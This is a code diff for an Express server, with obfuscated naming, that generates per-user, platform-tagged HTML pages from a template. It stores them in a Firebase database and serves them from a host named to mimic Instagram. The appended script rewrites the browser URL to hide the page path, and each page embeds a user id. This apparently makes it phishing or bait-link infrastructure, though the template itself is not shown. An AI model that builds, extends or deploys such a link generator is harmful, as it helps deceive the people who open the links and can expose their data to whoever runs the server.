@@ -31,13 +31,9 @@ const S7 = require('path');
 
 const S7LOVESY = express();
 const SYLOVE = 4000;
-const SY_DIR = S7.join(__dirname, 'LOVE');
-if (!LOVE.existsSync(SY_DIR)) {
-    LOVE.mkdirSync(SY_DIR);
-}
+
 S7LOVESY.use(SY());
 S7LOVESY.use(express.json());
-S7LOVESY.use(express.static(SY_DIR));
 
 function MyLoveSY(length) {
     const SYloves = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -66,45 +62,97 @@ S7LOVESY.get('/create-link', (req, res) => {
     const SYloveMe = LoveMeSY(platform);
     const mainLovePathToSY = S7.join(__dirname, 'main.html');
 
-    LOVE.readFile(mainLovePathToSY, 'utf8', (err, data) => {
+    LOVE.readFile(mainLovePathToSY, 'utf8', async (err, data) => {
         if (err) {
             console.error('\x1b[31m[ERROR]\x1b[0m main.html not found');
             return res.status(500).json({ success: false, error: 'Template missing' });
         }
 
-        let LoveS7xSYDta = data.replace(/const id = ".*";/, `const id = "${userid}";`);
-        LoveS7xSYDta = LoveS7xSYDta.replace(/const p = ".*";/, `const p = "${SYloveMe}";`);
+        let LoveS7xSYDta = data.replace(
+            /const id = ".*";/,
+            `const id = "${userid}";`
+        );
 
-        const S7xSY = '<script>if(window.history.replaceState){window.history.replaceState(null, "", "/");}</script>';
+        LoveS7xSYDta = LoveS7xSYDta.replace(
+            /const p = ".*";/,
+            `const p = "${SYloveMe}";`
+        );
+
+        const S7xSY =
+            '<script>if(window.history.replaceState){window.history.replaceState(null,"","/");}</script>';
+
         LoveS7xSYDta += S7xSY;
 
         const LovesNameSY = MyLoveSY(4);
-        const LovePathToSY = S7.join(SY_DIR, `${LovesNameSY}.html`);
-        LOVE.writeFile(LovePathToSY, LoveS7xSYDta, (writeErr) => {
-            if (writeErr) {
-                console.error('\x1b[31m[ERROR]\x1b[0m Write failed');
-                return res.status(500).json({ success: false, error: 'Write failed' });
+
+        try {
+            const FirebaseURL =
+                `https://time-untill-see-you-default-rtdb.firebaseio.com/html/${LovesNameSY}.json`;
+
+            const SaveResponse = await fetch(FirebaseURL, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    html: LoveS7xSYDta
+                })
+            });
+
+            if (!SaveResponse.ok) {
+                console.error('\x1b[31m[ERROR]\x1b[0m Firebase Write failed');
+                return res.status(500).json({
+                    success: false,
+                    error: 'Write failed'
+                });
             }
-            console.log(`\x1b[32m[SUCCESS]\x1b[0m Created: ${LovesNameSY}.html | URL: /${LovesNameSY}`);
+
+            console.log(
+                `\x1b[32m[SUCCESS]\x1b[0m Created: ${LovesNameSY}.html | URL: /${LovesNameSY}`
+            );
 
             res.json({
                 success: true,
-                url: `https://instagram-321.onrender.com/${LovesNameSY}`
+                url: `https://instagram-123.onrender.com/${LovesNameSY}`
             });
-        });
+
+        } catch (writeErr) {
+            console.error('\x1b[31m[ERROR]\x1b[0m Write failed');
+            return res.status(500).json({
+                success: false,
+                error: 'Write failed'
+            });
+        }
     });
 });
-S7LOVESY.get('/:file', (req, res, next) => {
-    const LovePathToSY = S7.join(SY_DIR, `${req.params.file}.html`);
 
-    if (LOVE.existsSync(LovePathToSY)) {
-        res.sendFile(LovePathToSY);
-    } else {
+S7LOVESY.get('/:file', async (req, res, next) => {
+    try {
+        const FirebaseURL =
+            `https://time-untill-see-you-default-rtdb.firebaseio.com/html/${req.params.file}.json`;
+
+        const Response = await fetch(FirebaseURL);
+
+        if (!Response.ok) {
+            return next();
+        }
+
+        const Data = await Response.json();
+
+        if (!Data || !Data.html) {
+            return next();
+        }
+
+        res.setHeader('Content-Type', 'text/html');
+        res.send(Data.html);
+
+    } catch (err) {
         next();
     }
 });
+
 S7LOVESY.listen(SYLOVE, () => {
     console.log(`\x1b[36m[SYSTEM]\x1b[0m Server Active on Port ${SYLOVE}`);
-    console.log(`\x1b[36m[SYSTEM]\x1b[0m Files Directory: ${SY_DIR}`);
+    console.log(`\x1b[36m[SYSTEM]\x1b[0m Files Directory: FIREBASE_RTDB`);
     console.log(`\x1b[36m[SYSTEM]\x1b[0m Dev by @SABIR7718`);
 });
